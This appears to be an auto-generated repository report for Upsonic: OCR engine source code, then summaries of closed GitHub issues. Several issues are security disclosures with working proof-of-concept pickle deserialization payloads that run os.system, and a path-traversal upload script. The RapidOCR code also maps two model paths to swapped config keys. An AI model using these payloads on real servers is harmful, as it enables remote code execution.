            rec_model_path: Path to custom text recognition model file (ONNX format)
            cls_model_path: Path to custom text direction classifier model file (ONNX format)
            **kwargs: Additional configuration arguments
        """
        self.det_model_path = det_model_path
        self.rec_model_path = rec_model_path
        self.cls_model_path = cls_model_path
        self._engine = None
        super().__init__(config, **kwargs)
    
    @property
    def name(self) -> str:
        return "rapidocr"
    
    @property
    def supported_languages(self) -> List[str]:
        """RapidOCR primarily supports Chinese and English."""
        return [
            'en', 'ch', 'chinese_cht', 'japan', 'korean',
            'ta', 'te', 'ka', 'latin', 'arabic', 'cyrillic',
            'devanagari'
        ]
    
    def _validate_dependencies(self) -> None:
        """Validate that RapidOCR is installed."""
        if not _RAPIDOCR_AVAILABLE:
            from upsonic.utils.printing import import_error
            import_error(
                package_name="rapidocr-onnxruntime",
                install_command='pip install rapidocr-onnxruntime',
                feature_name="RapidOCR provider"
            )
    
    def _get_reader(self):
        """Get or create RapidOCR engine instance (thread-safe)."""
        if self._engine is not None:
            return self._engine
        with self._reader_lock:
            if self._engine is not None:
                return self._engine
            from upsonic.utils.printing import ocr_language_not_supported, ocr_loading, ocr_initialized

            unsupported_langs = [lang for lang in self.config.languages if lang not in self.supported_languages]
            if unsupported_langs:
                ocr_language_not_supported(
                    provider_name="RapidOCR",
                    unsupported_langs=unsupported_langs,
                    supported_langs=self.supported_languages,
                    help_url=None
                )
                raise OCRProviderError(
                    f"Language(s) not supported by RapidOCR: {', '.join(unsupported_langs)}",
                    error_code="UNSUPPORTED_LANGUAGE"
                )

            extra_info = {
                "Note": "Primarily supports Chinese and English"
            }

            # Add model path info if custom models are provided
            if self.det_model_path or self.rec_model_path or self.cls_model_path:
                model_info = []
                if self.det_model_path:
                    model_info.append(f"det={self.det_model_path}")
                if self.rec_model_path:
                    model_info.append(f"rec={self.rec_model_path}")
                if self.cls_model_path:
                    model_info.append(f"cls={self.cls_model_path}")
                extra_info["Custom Models"] = ", ".join(model_info)

            ocr_loading("RapidOCR", self.config.languages, extra_info)

            try:
                # Build engine initialization arguments
                engine_kwargs = {}

                # Add custom model paths if provided
                if self.det_model_path:
                    engine_kwargs['Det.model_path'] = self.det_model_path
                if self.rec_model_path:
                    engine_kwargs['CLs.model_path'] = self.rec_model_path
                if self.cls_model_path:
                    engine_kwargs['Rec.model_path'] = self.cls_model_path

                self._engine = _RapidOCR(**engine_kwargs) if engine_kwargs else _RapidOCR()
                ocr_initialized("RapidOCR")
            except Exception as e:
                raise OCRProviderError(
                    f"Failed to initialize RapidOCR engine: {str(e)}",
                    error_code="ENGINE_INIT_FAILED",
                    original_error=e
                )
        return self._engine
    
    def _process_image(self, image, **kwargs) -> OCRResult:
        """Process a single image with RapidOCR.
        
        Args:
            image: PIL Image object
            **kwargs: Additional arguments
            
        Returns:
            OCRResult object
        """
        try:
            engine = self._get_reader()
            
            # Convert PIL Image to numpy array
            img_array = np.array(image)
            
            # Perform OCR
            # RapidOCR returns: (dt_boxes, rec_res, time_dict) or (dt_boxes, rec_res) or None
            result = engine(img_array)
            
            if result is None or not result[0]:
                # No text detected
                return OCRResult(
                    text="",
                    blocks=[],
                    confidence=0.0,
                    page_count=1,
                    provider=self.name
                )
            
            # Handle different return formats
            if len(result) == 3:
                dt_boxes, rec_res, time_dict = result
            else:
                dt_boxes, rec_res = result
                time_dict = {}
            
            # Process results
            blocks = []
            text_parts = []
            confidences = []
            
            # RapidOCR format: dt_boxes is a list where each item is [box_coords, text, confidence_str]
            for item in dt_boxes:
                # Each item is [box_coords, text, confidence_str]
                if not isinstance(item, (list, tuple)) or len(item) < 3:
                    continue
                
                box_coords, text, confidence_str = item[0], item[1], item[2]
                
                # Convert confidence string to float
                try:
                    confidence = float(confidence_str)
                except (ValueError, TypeError):
                    confidence = 0.0
                
                # Filter by confidence threshold
                if confidence < self.config.confidence_threshold:
                    continue
                
                # Extract bounding box
                # box_coords is array of 4 points: [[x1,y1], [x2,y2], [x3,y3], [x4,y4]]
                x_coords = [point[0] for point in box_coords]
                y_coords = [point[1] for point in box_coords]
                
                bbox = BoundingBox(
                    x=float(min(x_coords)),
                    y=float(min(y_coords)),
                    width=float(max(x_coords) - min(x_coords)),
                    height=float(max(y_coords) - min(y_coords)),
                    confidence=float(confidence)
                )
                
                block = OCRTextBlock(
                    text=text,
                    confidence=float(confidence),
                    bbox=bbox,
                    language=None
                )
                
                blocks.append(block)
                text_parts.append(text)
                confidences.append(confidence)
            
            # Combine text
            combined_text = " ".join(text_parts) if text_parts else ""
            avg_confidence = sum(confidences) / len(confidences) if confidences else 0.0
            
            return OCRResult(
                text=combined_text,
                blocks=blocks,
                confidence=avg_confidence,
                page_count=1,
                provider=self.name,
                metadata={'processing_time': time_dict}
            )
            
        except Exception as e:
            if isinstance(e, OCRProviderError):
                raise
            raise OCRProcessingError(
                f"RapidOCR processing failed: {str(e)}",
                error_code="RAPIDOCR_PROCESSING_FAILED",
                original_error=e
            )


```

### Core Architecture Module: `src/upsonic/ocr/layer_1/engines/tesseract.py`
```
from __future__ import annotations

from typing import List, Optional, Dict, Any

from upsonic.ocr.base import OCRProvider, OCRConfig, OCRResult, OCRTextBlock, BoundingBox
from upsonic.ocr.exceptions import OCRProviderError, OCRProcessingError

try:
    import pytesseract
    _PYTESSERACT_AVAILABLE = True
except ImportError:
    pytesseract = None
    _PYTESSERACT_AVAILABLE = False


class TesseractOCREngine(OCRProvider):
    """Tesseract OCR engine for text extraction.

    Tesseract is Google's open-source OCR engine with support for 100+ languages.
    It's one of the most accurate open-source OCR engines available.

    Note: Requires Tesseract to be installed on the system.
    - Ubuntu/Debian: sudo apt-get install tesseract-ocr
    - macOS: brew install tesseract
    - Windows: Download installer from GitHub

    Example:
        >>> from upsonic.ocr.layer_1.engines import TesseractOCREngine
        >>> ocr = TesseractOCREngine(languages=['eng'], rotation_fix=True)
        >>> text = ocr.get_text('document.pdf')
    """
    
    def __init__(
        self,
        config: Optional[OCRConfig] = None,
        tesseract_cmd: Optional[str] = None,
        tessdata_dir: Optional[str] = None,
        **kwargs
    ):
        """Initialize Tesseract OCR provider.
        
        Args:
            config: OCRConfig object
            tesseract_cmd: Path to tesseract executable (optional)
            tessdata_dir: Path to custom tessdata directory containing trained data files.
                If None, uses Tesseract's default location or TESSDATA_PREFIX environment variable
            **kwargs: Additional configuration arguments
        """
        self.tesseract_cmd = tesseract_cmd
        self.tessdata_dir = tessdata_dir
        super().__init__(config, **kwargs)
        
        # Set tesseract command if provided
        if self.tesseract_cmd and _PYTESSERACT_AVAILABLE:
            pytesseract.pytesseract.tesseract_cmd = self.tesseract_cmd
        
        # Set tessdata directory if provided
        if self.tessdata_dir and _PYTESSERACT_AVAILABLE:
            import os
            # Set environment variable for tessdata path
            os.environ['TESSDATA_PREFIX'] = self.tessdata_dir
    
    @property
    def name(self) -> str:
        return "tesseract"
    
    @property
    def supported_languages(self) -> List[str]:
        """Tesseract supports 100+ languages."""
        # Common language codes - full list depends on installed language packs
        return [
            'eng', 'fra', 'deu', 'spa', 'por', 'ita', 'nld', 'pol', 'rus',
            'jpn', 'chi_sim', 'chi_tra', 'kor', 'ara', 'hin', 'ben', 'tel',
            'mar', 'tam', 'guj', 'kan', 'mal', 'pan', 'tha', 'vie', 'tur',
            'heb', 'fas', 'ukr', 'ell', 'ces', 'dan', 'fin', 'hun', 'ind',
            'msa', 'nor', 'ron', 'swe', 'bul', 'hrv', 'lit', 'lav', 'est',
            'slk', 'slv', 'srp', 'cat', 'glg', 'eus', 'isl', 'gle', 'mlt',
            'cym', 'sqi', 'aze', 'bel', 'kat', 'arm', 'mkd', 'mon', 'uzb',
        ]
    
    def _validate_dependencies(self) -> None:
        """Validate that pytesseract is installed."""
        if not _PYTESSERACT_AVAILABLE:
            from upsonic.utils.printing import import_error
            import_error(
                package_name="pytesseract",
                install_command='pip install pytesseract',
                feature_name="Tesseract OCR provider"
            )
        
        from upsonic.utils.printing import ocr_language_not_supported, ocr_loading, ocr_initialized, warning_log
        
        try:
            version = pytesseract.get_tesseract_version()
            extra_info = {"Version": version.public}
            ocr_loading("Tesseract OCR", self.config.languages, extra_info)
        except Exception as e:
            raise OCRProviderError(
                "Tesseract is not installed or not in PATH. "
                "Please install Tesseract OCR:\n"
                "  Ubuntu/Debian: sudo apt-get install tesseract-ocr\n"
                "  macOS: brew install tesseract\n"
                "  Windows: Download from https://github.com/UB-Mannheim/tesseract/wiki",
                error_code="TESSERACT_NOT_INSTALLED",
                original_error=e
            )
        
        try:
            available_langs = pytesseract.get_languages(config='')
            unsupported_langs = [lang for lang in self.config.languages if lang not in available_langs]
            if unsupported_langs:
                ocr_language_not_supported(
                    provider_name="Tesseract OCR",
                    unsupported_langs=unsupported_langs,
                    supported_langs=available_langs,
                    help_url="https://tesseract-ocr.github.io/tessdoc/Data-Files-in-different-versions.html"
                )
                raise OCRProviderError(
                    f"Language pack(s) not installed for Tesseract: {', '.join(unsupported_langs)}",
                    error_code="UNSUPPORTED_LANGUAGE"
                )
            ocr_initialized("Tesseract OCR")
        except OCRProviderError:
            raise
        except Exception:
            warning_log("Could not verify language pack availability", "Tesseract OCR")
    
    def _get_reader(self):
        """Return the pytesseract module (thread-safe, stateless).

        Tesseract is invoked via the ``pytesseract`` wrapper which is
        effectively stateless — there is no heavyweight reader object to
        create.  This implementation satisfies the base-class contract.
        """
        if not _PYTESSERACT_AVAILABLE:
            raise OCRProviderError(
                "pytesseract is not available. Please install it: pip install pytesseract",
                error_code="PYTESSERACT_NOT_AVAILABLE"
            )
        return pytesseract

    def _get_tesseract_config(self, **kwargs) -> str:
        """Build Tesseract configuration string.
        
        Args:
            **kwargs: Additional Tesseract-specific options
            
        Returns:
            Configuration string for Tesseract
        """
        config_parts = []
        
        # Page segmentation mode (PSM)
        psm = kwargs.get('psm', 3)  # Default: 3 = Fully automatic page segmentation
        config_parts.append(f'--psm {psm}')
        
        # OCR Engine Mode (OEM)
        oem = kwargs.get('oem', 3)  # Default: 3 = Both legacy and LSTM engines
        config_parts.append(f'--oem {oem}')
        
        # Add tessdata directory if provided
        if self.tessdata_dir:
            config_parts.append(f'--tessdata-dir "{self.tessdata_dir}"')
        
        # Additional custom config
        custom_config = kwargs.get('custom_config', '')
        if custom_config:
            config_parts.append(custom_config)
        
        return ' '.join(config_parts)
    
    def _process_image(self, image, **kwargs) -> OCRResult:
        """Process a single image with Tesseract.
        
        Args:
            image: PIL Image object
            **kwargs: Additional arguments (psm, oem, custom_config, etc.)
            
        Returns:
            OCRResult object
        """
        try:
            # Prepare language string for Tesseract
            # Tesseract uses '+' to separate multiple languages
            lang_string = '+'.join(self.config.languages)
            
            tesseract_config = self._get_tesseract_config(**kwargs)
            
            # Get detailed OCR data with bounding boxes
            data = pytesseract.image_to_data(
                image,
                lang=lang_string,
                config=tesseract_config,
                output_type=pytesseract.Output.DICT
            )
            
            blocks = []
            text_parts = []
            confidences = []
            
            n_boxes = len(data['text'])
            for i in range(n_boxes):
                text = data['text'][i].strip()
                if not text:
                    continue
                
                confidence = float(data['conf'][i]) / 100.0  # Convert to 0-1 range
                
                # Filter by confidence threshold
                if confidence < self.config.confidence_threshold:
                    continue
                
                # Extract bounding box
                x = float(data['left'][i])
                y = float(data['top'][i])
                w = float(data['width'][i])
                h = float(data['height'][i])
                
                bbox = BoundingBox(
                    x=x,
                    y=y,
                    width=w,
                    height=h,
                    confidence=confidence
                )
                
                block = OCRTextBlock(
                    text=text,
                    confidence=confidence,
                    bbox=bbox,
                    language=None  # Tesseract doesn't return per-block language
                )
                
                blocks.append(block)
                text_parts.append(text)
                confidences.append(confidence)
            
            # Also get the full text with layout preserved (if requested)
            if self.config.preserve_formatting:
                full_text = pytesseract.image_to_string(
                    image,
                    lang=lang_string,
                    config=tesseract_config
                ).strip()
            else:
                full_text = " ".join(text_parts) if text_parts else ""
            
            avg_confidence = sum(confidences) / len(confidences) if confidences else 0.0
            
            return OCRResult(
                text=full_text,
                blocks=blocks,
                confidence=avg_confidence,
                page_count=1,
                provider=self.name
            )
            
        except Exception as e:
            if isinstance(e, OCRProviderError):
                raise

```

### Core Architecture Module: `src/upsonic/ocr/utils.py`
```
from __future__ import annotations

from pathlib import Path
from typing import List, Tuple, Union

from upsonic.ocr.exceptions import (
    OCRFileNotFoundError,
    OCRUnsupportedFormatError,
    OCRProcessingError,
)

try:
    from PIL import Image
    import numpy as np
    _PIL_AVAILABLE = True
except ImportError:
    Image = None
    np = None
    _PIL_AVAILABLE = False

try:
    import pdf2image
    _PDF2IMAGE_AVAILABLE = True
except ImportError:
    pdf2image = None
    _PDF2IMAGE_AVAILABLE = False

# Track if we need to check for poppler
_POPPLER_CHECKED = False


SUPPORTED_IMAGE_FORMATS = {'.png', '.jpg', '.jpeg', '.bmp', '.tiff', '.tif', '.webp'}
SUPPORTED_PDF_FORMATS = {'.pdf'}
ALL_SUPPORTED_FORMATS = SUPPORTED_IMAGE_FORMATS | SUPPORTED_PDF_FORMATS


def check_dependencies():
    """Check if required dependencies are installed."""
    if not _PIL_AVAILABLE:
        from upsonic.utils.printing import import_error
        import_error(
            package_name="Pillow",
            install_command='pip install Pillow',
            feature_name="OCR image processing"
        )


def check_pdf_dependencies():
    """Check if PDF processing dependencies are installed."""
    if not _PDF2IMAGE_AVAILABLE:
        from upsonic.utils.printing import import_error
        import_error(
            package_name="pdf2image",
            install_command='pip install pdf2image',
            feature_name="PDF OCR processing"
        )


def check_poppler_installed():
    """Check if poppler is installed and provide helpful installation instructions."""
    from upsonic.utils.printing import error_message
    import platform
    
    system = platform.system()
    
    if system == "Darwin":  # macOS
        install_cmd = "brew install poppler"
        detail = (
            "Poppler is not installed or not in PATH.\n\n"
            "Poppler is required for PDF processing.\n\n"
            "Installation instructions for macOS:\n"
            f"  {install_cmd}\n\n"
            "After installation, restart your terminal or IDE."
        )
    elif system == "Linux":
        install_cmd = "sudo apt-get install poppler-utils"
        detail = (
            "Poppler is not installed or not in PATH.\n\n"
            "Poppler is required for PDF processing.\n\n"
            "Installation instructions for Linux:\n"
            f"  Ubuntu/Debian: {install_cmd}\n"
            "  Fedora/RHEL: sudo dnf install poppler-utils\n"
            "  Arch: sudo pacman -S poppler\n\n"
            "After installation, restart your terminal or IDE."
        )
    elif system == "Windows":
        detail = (
            "Poppler is not installed or not in PATH.\n\n"
            "Poppler is required for PDF processing.\n\n"
            "Installation instructions for Windows:\n"
            "  1. Download poppler from: https://github.com/oschwartz10612/poppler-windows/releases/\n"
            "  2. Extract the archive to a location (e.g., C:\\Program Files\\poppler)\n"
            "  3. Add the 'bin' folder to your system PATH:\n"
            "     - Search 'Environment Variables' in Windows\n"
            "     - Edit 'Path' in System Variables\n"
            "     - Add the path to poppler's bin folder\n"
            "  4. Restart your terminal or IDE\n\n"
            "Alternative: Install via conda:\n"
            "  conda install -c conda-forge poppler"
        )
    else:
        detail = (
            "Poppler is not installed or not in PATH.\n\n"
            "Poppler is required for PDF processing.\n\n"
            "Please install poppler-utils for your operating system.\n"
            "Visit: https://poppler.freedesktop.org/"
        )
    
    error_message(
        error_type="Poppler Not Installed",
        detail=detail
    )


def validate_file_path(file_path: Union[str, Path]) -> Path:
    """Validate that the file exists and is readable.
    
    Args:
        file_path: Path to the file to validate
        
    Returns:
        Path object of the validated file
        
    Raises:
        OCRFileNotFoundError: If the file does not exist
    """
    path = Path(file_path)
    if not path.exists():
        raise OCRFileNotFoundError(
            f"File not found: {file_path}",
            error_code="FILE_NOT_FOUND"
        )
    if not path.is_file():
        raise OCRFileNotFoundError(
            f"Path is not a file: {file_path}",
            error_code="NOT_A_FILE"
        )
    return path


def get_file_format(file_path: Union[str, Path]) -> str:
    """Get the file format from the file path.
    
    Args:
        file_path: Path to the file
        
    Returns:
        File extension in lowercase (e.g., '.pdf', '.png')
        
    Raises:
        OCRUnsupportedFormatError: If the format is not supported
    """
    path = Path(file_path)
    ext = path.suffix.lower()
    
    if ext not in ALL_SUPPORTED_FORMATS:
        raise OCRUnsupportedFormatError(
            f"Unsupported file format: {ext}. Supported formats: {', '.join(ALL_SUPPORTED_FORMATS)}",
            error_code="UNSUPPORTED_FORMAT"
        )
    
    return ext


def is_pdf(file_path: Union[str, Path]) -> bool:
    """Check if the file is a PDF.
    
    Args:
        file_path: Path to the file
        
    Returns:
        True if the file is a PDF, False otherwise
    """
    return get_file_format(file_path) in SUPPORTED_PDF_FORMATS


def is_image(file_path: Union[str, Path]) -> bool:
    """Check if the file is an image.
    
    Args:
        file_path: Path to the file
        
    Returns:
        True if the file is an image, False otherwise
    """
    return get_file_format(file_path) in SUPPORTED_IMAGE_FORMATS


def load_image(file_path: Union[str, Path]) -> Image.Image:
    """Load an image from a file path.
    
    Args:
        file_path: Path to the image file
        
    Returns:
        PIL Image object
        
    Raises:
        OCRProcessingError: If the image cannot be loaded
    """
    check_dependencies()
    
    try:
        path = validate_file_path(file_path)
        image = Image.open(path)

        # Apply EXIF orientation (phone photos are often rotated)
        from PIL import ImageOps
        image = ImageOps.exif_transpose(image)

        # Convert palette images directly to RGB
        # This preserves better contrast for OCR compared to RGBA->RGB conversion
        if image.mode == 'P':
            # Suppress the transparency warning and convert directly
            import warnings
            with warnings.catch_warnings():
                warnings.filterwarnings('ignore', category=UserWarning)
                image = image.convert('RGB')
        # Convert RGBA to RGB if necessary
        elif image.mode == 'RGBA':
            # Create a white background
            background = Image.new('RGB', image.size, (255, 255, 255))
            background.paste(image, mask=image.split()[3])  # Use alpha channel as mask
            image = background
        # Convert to RGB if necessary (but keep grayscale as-is)
        elif image.mode not in ('RGB', 'L'):
            image = image.convert('RGB')
        
        return image
    except Exception as e:
        if isinstance(e, (OCRFileNotFoundError, OCRUnsupportedFormatError)):
            raise
        raise OCRProcessingError(
            f"Failed to load image: {file_path}",
            error_code="IMAGE_LOAD_FAILED",
            original_error=e
        )


def pdf_to_images(file_path: Union[str, Path], dpi: int = 300) -> List[Image.Image]:
    """Convert a PDF file to a list of images.
    
    Args:
        file_path: Path to the PDF file
        dpi: DPI for rendering the PDF pages
        
    Returns:
        List of PIL Image objects, one per page
        
    Raises:
        OCRProcessingError: If the PDF cannot be converted
    """
    check_pdf_dependencies()
    check_dependencies()
    
    global _POPPLER_CHECKED
    
    try:
        path = validate_file_path(file_path)
        images = pdf2image.convert_from_path(str(path), dpi=dpi)
        return images
    except Exception as e:
        if isinstance(e, (OCRFileNotFoundError, OCRUnsupportedFormatError)):
            raise
        
        # Check if this is a poppler installation error
        error_str = str(e).lower()
        if ('poppler' in error_str or 
            'pdftoppm' in error_str or 
            'pdfinfo' in error_str or
            'unable to get page count' in error_str or
            type(e).__name__ == 'PDFInfoNotInstalledError'):
            
            # Show helpful poppler installation message
            if not _POPPLER_CHECKED:
                _POPPLER_CHECKED = True
                check_poppler_installed()
            
            raise OCRProcessingError(
                "Poppler is required for PDF processing but is not installed or not in PATH. "
                "Please see the installation instructions above.",
                error_code="POPPLER_NOT_INSTALLED",
                original_error=e
            )
        
        raise OCRProcessingError(
            f"Failed to convert PDF to images: {file_path}",
            error_code="PDF_CONVERSION_FAILED",
            original_error=e
        )


def detect_rotation(image: Image.Image) -> float:
    """Detect the rotation angle of text in an image.
    
    Args:
        image: PIL Image object
        
    Returns:
        Rotation angle in degrees (0, 90, 180, or 270)
    """
    check_dependencies()
    
    try:
        gray = image.convert('L')
        img_array = np.array(gray)
        
        # Simple heuristic: check variance in different orientations
        variances = []
        for angle in [0, 90, 180, 270]:
            rotated = Image.fromarray(img_array).rotate(angle, expand=True)
            rotated_array = np.array(rotated)
            # Calculate variance of horizontal projections (text lines)
            projection = np.sum(rotated_array, axis=1)
            variance = np.var(projection)
          
```


### D2: Asynchronous State & Concurrency
- Analyzed concurrency guarantees, async pipelines, and event handling from PR resolutions and commit changes.

### D3: Error Boundaries, Recovery & Rollbacks
- Exception handling patterns and defect resolutions extracted from closed production bug issues:
- **Issue #376** (2026-01-28): **Context parameter in Task not working**
  *Symptoms*: **Context parameter in Task not working** **To Reproduce** Steps to reproduce the behavior: 1. Use this code (Basic example): ```python from upsonic import Task, Agent  # String as Context city = "New York"   # Creating Task task = Task(   "Find eating places in the city",   context=[city] # Adding city string as context )  # Creating Agent agent = Agent(name="City Guide")  # Running the task agent.print_do(task) ```  4. See error <img width="772" alt="Image" src="https://github.com/user-attachments/assets/5eb81ab6-7219-44bc-a194-52a564ef2595" />  **Expected behavior with my quick solution mentioned at the end** <img width="647" alt="Image" src="https://github.com/user-attachments/assets/a4eeb472-d6d6-492e-8fb4-c3883755b682" />   **Desktop (please complete the following information):**  - OS: [MacOS]  - Upsonic Version 0.59.11 - Python Version [3.11]   **Additional context** My quick **solution worked** : ```python task = Task(   "Find eating places in the city" + city,   #context=[city] # Adding city string as context ) ```  **Notes to team** Analyze here detailedly <img width="940" alt="Image" src="https://github.com/user-attachments/assets/e15160e3-72f8-4fab-9673-66e261559fd9" /> 
  **Post-Mortem & Fix Analysis**:
  > Hello, i will fix that.
  > Hey, If I understood the issue correctly, the problem is about passing the context into the prompt whenever it's a string. In the current code, it doesn't accept the string as context. I just added an `Additional Context` in the system instructions.  Here is the PR for it: https://github.com/Upsonic/Upsonic/pull/378  Current System Instructions: ```bash Find eating places in the city <Context> 	<Agents></Agents> 	<Tasks></Tasks> 	<Default Prompt>Default Prompt: You are a helpful assistant that can answer questions and help with tasks. Please be logical, concise, and to the point. Your provider is Upsonic. Think in your backend and dont waste time to write to the answer. Write only what the user want. About the context: If there is an Task context user want you to know that. Use it to think in your backend. </Default Prompt> 	<Knowledge Base></Knowledge Base> </Context> ```  System Instructions After the PR: ```bash Find eating places in the city <Context> 	<Agents></Agents> 	<Tasks></T
  > Hello, thanks for opening this.  We’ve recently shipped major updates and refactors, so I’m closing this for now.  Please feel free to try the latest version here: https://github.com/Upsonic/Upsonic  If the problem still exists or you have new feedback, please feel free to open a fresh issue.

- **Issue #359** (2026-01-28): **[Security] RCE in get_temporary_memory Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]**
  *Symptoms*: # RCE in get_temporary_memory Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]  ## Summary  When user is running Upsonic server, attacker can achieve RCE by sending well-designed crafted data.  Sink function:  - src/upsonic/server/level_two/server/server.py   - call_agent     - Agent.agent       - get_temporary_memory         - pickle.loads  Sink code snippet:  ```python def get_temporary_memory(agent_id: str) -> list:     serialized_messages = Configuration.get(f"temp_memory_{agent_id}")     if serialized_messages is None:         return None          # Deserialize messages from base64 encoded pickle     messages = pickle.loads(base64.b64decode(serialized_messages))     return messages ```    ## POC  ### build  ```shell mkdir Upsonic_test cd Upsonic_test git clone https://github.com/Upsonic/Upsonic.git cp Upsonic/Dockerfile . docker build -t Upsonic . ```  ### reproduce  Run the docker  ```shell docker run -d --name Upsonic Upsonic ```  Generate attack payload  ```python import pickle import os import base64 class Evil:     def __reduce__(self):         return (os.system, ("echo 'pwned by CoolwindHF'",))      evil = Evil() evil_pickled = pickle.dumps(evil, protocol=0) print(base64.b64encode(evil_pickled).decode())  # Y3Bvc2l4CnN5c3RlbQpwMAooVmVjaG8gJ3B3bmVkIGJ5IENvb2x3aW5kSEYnCnAxCnRwMgpScDMKLg== ```  As we can see, via the function `src/upsonic/server/storage/server/server.py#set_config`, as well as the route named `/storage/config/set`, we can set any key
  **Post-Mortem & Fix Analysis**:
  > Closing this for the same reason mentioned above. Please refer to the previous comment for details. Thanks.

- **Issue #358** (2026-01-28): **[Security] RCE in call_agent Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]**
  *Symptoms*: # RCE in call_agent Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]  ## Summary  When user is running Upsonic server, attacker can achieve RCE by sending well-designed crafted data.  Sink function:  - src/upsonic/server/level_two/server/server.py   - call_agent     - cloudpickle.loads (at line 49)  Sink code snippet:  ```python async def call_agent(request: AgentRequest):     try:         # Handle pickled response format         if request.response_format != "str":             try:                 # Decode and unpickle the response format                 pickled_data = base64.b64decode(request.response_format)                 response_format = cloudpickle.loads(pickled_data)                                  ... ```  ## POC  ### build  ```shell mkdir Upsonic_test cd Upsonic_test git clone https://github.com/Upsonic/Upsonic.git cp Upsonic/Dockerfile . docker build -t Upsonic . ```  ### reproduce  Run the docker  ```shell docker run -d --name Upsonic Upsonic ```  Generate attack payload  ```python import pickle import os import base64 class Evil:     def __reduce__(self):         return (os.system, ("echo 'pwned by CoolwindHF'",))      evil = Evil() evil_pickled = pickle.dumps(evil, protocol=0) print(base64.b64encode(evil_pickled).decode())  # Y3Bvc2l4CnN5c3RlbQpwMAooVmVjaG8gJ3B3bmVkIGJ5IENvb2x3aW5kSEYnCnAxCnRwMgpScDMKLg== ```  Then send the base64 encoded payload to the server, you can find the command is executed  <img width="1524" alt="Image" src="https://g
  **Post-Mortem & Fix Analysis**:
  > Closing this for the same reason mentioned before. Please refer to the previous comment for details. Thanks.

- **Issue #357** (2026-01-28): **[Security] RCE in call_agent Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]**
  *Symptoms*: # RCE in call_agent Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]  ## Summary  When user is running Upsonic server, attacker can achieve RCE by sending well-designed crafted data.  Sink function:  - src/upsonic/server/level_two/server/server.py   - call_agent     - cloudpickle.loads (at line 65)  Sink code snippet:  ```python async def call_agent(request: AgentRequest): 			... 			... 			         if request.context is not None:             try:                 pickled_context = base64.b64decode(request.context)                 context = cloudpickle.loads(pickled_context)                        ... ```    ## POC  ### build  ```shell mkdir Upsonic_test cd Upsonic_test git clone https://github.com/Upsonic/Upsonic.git cp Upsonic/Dockerfile . docker build -t Upsonic . ```  ### reproduce  Run the docker  ```shell docker run -d --name Upsonic Upsonic ```  Generate attack payload  ```python import pickle import os import base64 class Evil:     def __reduce__(self):         return (os.system, ("echo 'pwned by CoolwindHF'",))      evil = Evil() evil_pickled = pickle.dumps(evil, protocol=0) print(base64.b64encode(evil_pickled).decode())  # Y3Bvc2l4CnN5c3RlbQpwMAooVmVjaG8gJ3B3bmVkIGJ5IENvb2x3aW5kSEYnCnAxCnRwMgpScDMKLg== ```  Then send the base64 encoded payload to the server, you can find the command is executed  <img width="1524" alt="Image" src="https://github.com/user-attachments/assets/95677e75-4bdb-4f15-9877-9423aaa1f3eb" />  <img width="788" alt="Image" src="htt
  **Post-Mortem & Fix Analysis**:
  > Hello, thanks for opening this. Since Upsonic went through multiple transitions (GCA to early Upsonic to current version), many older issues and PRs are no longer relevant to the current architecture.  We’ve recently shipped major updates and refactors, so I’m closing this for now.  Please feel free to try the latest version here: https://github.com/Upsonic/Upsonic  If the problem still exists or you have new feedback, please feel free to open a fresh issue.

- **Issue #356** (2026-01-28): **[Security] Path Traversal Vulnerability in File Upload Function of Upsonic/Upsonic**
  *Symptoms*: # Path Traversal Vulnerability in File Upload Function of Upsonic/Upsonic  # Summary  Attackers can exploit a directory traversal vulnerability by manipulating the filename parameter in the file upload function to create arbitrary files on the target host. The vulnerability originates from line 39 in `markdown/server.py`, where the code `file_path = os.path.join(temp_dir, file.filename)` does not sanitize the file.filename.  # POC  ## Build  Follow these steps to set up the test environment:  ```shell mkdir Upsonic_test cd Upsonic_test git clone https://github.com/Upsonic/Upsonic cp Dockerfile .. ; cd .. sudo docker build -t upsonic_test . ```  ## Reproduce  - Start the Docker container:  ```shell sudo docker run -v -d -p 5901:5901 -p 7541:7541 upsonic_test ```  - Use Python to send a malicious request:  ```python import requests  # Endpoint URL url = "http://127.0.0.1:7541/markdown/upload"  # Create the file that the attacker wants to upload file_path = "flag" with open(file_path, "wb") as file:     file.write(b"hacked!")  # Open and send the file with open(file_path, "rb") as file:     files = {"file": ("../flag", file)}     try:         response = requests.post(url, files=files)                  # Check if the request was successful         if response.status_code == 200:             print("Success! Markdown content:")             print(response.json().get("markdown"))         else:             print(f"Error: {response.status_code} - {response.text}")                  exce
  **Post-Mortem & Fix Analysis**:
  > Hello, thanks for opening this. We’ve recently shipped major updates and refactors, so I’m closing this for now.  Please feel free to try the latest version here: https://github.com/Upsonic/Upsonic  If the problem still exists or you have new feedback, please feel free to open a fresh issue.

- **Issue #355** (2026-01-28): **[Security] RCE in call_gpt4o Function and Multiple Functions Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]**
  *Symptoms*: # Summmary  When user is runing Upsonic, attacker via multiple interface to achieve RCE by sending carefully crafted data.  Affected interfaces include:  - /level_two/agent - /level_one/gpt4o  # Reproduce  Let's take the call_gpt4o interface as an example.  ## run  ```bash docker run -p 7541:7541 upsonic/server ```  ## poc  ```python import pickle import base64 import requests import os  class PickleRCE(object):     def __reduce__(self):         command = "whoami"         return (os.system, (command,))  serialized_data = pickle.dumps(PickleRCE()) response_format_b64 = base64.b64encode(serialized_data).decode('utf-8')  payload = {     "prompt": "foo",     "images": [],     "response_format": response_format_b64,     "tools": "foo",     "context": "foo",     "llm_model": "foo",     "system_prompt": "foo" }  url = "http://127.0.0.1:7541/level_one/gpt4o" headers = {"Content-Type": "application/json"}  response = requests.post(url, json=payload, headers=headers)  print(f"Status Code: {response.status_code}") print(f"Response Content: {response.text}") ```  upsonic server docker logs:  ![Image](https://github.com/user-attachments/assets/68a8638c-c052-4dd3-a7cd-0e2f0bbfe9f8)  # Impact  RCE  # Credit  The vulnerability was discovered by Tencent YunDing Security Lab.
  **Post-Mortem & Fix Analysis**:
  > Closing this for the same reason mentioned before. Please refer to the previous comment for details. Thanks.

- **Issue #354** (2026-01-27): **[BUG] The backend task cannot be terminated and is in a hung state, making it impossible to exit completely.**
